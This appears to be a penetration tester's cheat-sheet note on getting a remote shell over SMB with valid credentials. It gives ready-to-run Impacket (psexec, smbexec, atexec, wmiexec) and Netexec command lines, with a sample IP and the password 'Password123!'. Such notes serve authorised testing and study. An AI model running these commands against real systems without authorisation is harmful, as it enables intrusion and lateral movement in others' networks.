-- -
Get a shell on remote system via SMB. This is for when you have valid credentials but no SSH or RDP access and you want to get a shell on the system. From a windows sysem, you can use the actual PSExec Sysinterals tool located [here](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec). Otherwise, from Linux, you can use one of the following tools which implement similar functionality albeit in slightly different ways: ^98f86e
1. Impacket PsExec
2. Impacket SMBExec
3. Impacket atexec
4. Netexec
5. Metasploit PsExec
### Impacket
```bash
# same syntax for all 3

# PsExec
impacket-psexec <user>:'<passwd>'@<ip> 
impacket-psexec administrator:'Password123!'@10.10.110.17
impacket-psexec [domain]/[user]:'[passwd]'@[ip]

# SMBExec
impacket-smbexec <user>:'<passwd>'@<ip>
impacket-smbexec administrator:'Password123!'@10.10.110.17

# atexec
impacket-atexec <user>:'<passwd>'@<ip>
impacket-atexec administrator:'Password123!'@10.10.110.17

# wmiexec
impacket-wmiexec [domain]/[user]:'[passwd]'@[ip]
```

^2f3c64

### Netexec
```bash
# if --exec-method is not definied, it defaults to "atexec"
netexec smb <ip> -u <user> -p '<passwd>' -x '<cmd>' --exec-method smbexec
netexec smb <ip> -u <user> -p '<passwd>' -x '<cmd>' --exec-method atexec

netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
netexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method atexec
```

^5193b2
